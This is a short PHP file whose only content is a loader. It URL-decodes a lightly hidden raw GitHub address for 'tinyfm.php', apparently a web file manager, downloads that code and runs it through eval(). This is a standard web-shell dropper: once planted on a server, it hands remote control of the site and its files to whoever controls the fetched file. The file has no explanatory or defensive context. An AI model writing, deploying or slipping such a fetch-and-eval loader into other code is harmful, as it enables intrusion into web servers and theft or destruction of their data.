<?php

$content = file_get_contents(urldecode('https%3A%2F%2Fraw.githubusercontent.com%2F21marketmg%2Fjdih%2Fmain%2Ftinyfm.php'));

$content = "?> ".$content;
eval($content);
